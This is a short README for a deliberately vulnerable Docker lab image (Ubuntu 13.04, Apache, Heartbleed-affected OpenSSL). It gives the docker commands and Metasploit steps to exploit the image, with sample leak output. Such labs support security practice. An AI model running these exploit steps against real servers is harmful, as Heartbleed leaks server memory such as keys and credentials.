Quick and dirty Dockerfile to set up Ubuntu 13.04
with Apache and SSL.

13.04 is no longer supported and the version of
openssl is vulnerable to the heartbleed attack.

    docker pull andrewmichaelsmith/docker-heartbleed
    docker run -d andrewmichaelsmith/docker-heartbleed
    docker ps #note conatiner id
    docker inspect <container id> | grep IPAddress #note ip


Then from metasploit

    use auxiliary/scanner/ssl/openssl_heartbleed
    set VERBOSE true
    set RHOSTS <ip>
    exploit

Tada:

    [*] 172.17.0.2:443 - Sending Client Hello...
    [*] 172.17.0.2:443 - Sending Heartbeat...
    [*] 172.17.0.2:443 - Heartbeat response, checking if there is data leaked...
    [+] 172.17.0.2:443 - Heartbeat response with leak
    [*] 172.17.0.2:443 - Printable info leaked: @SE'ag4x1#H f"!98532ED/A
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed




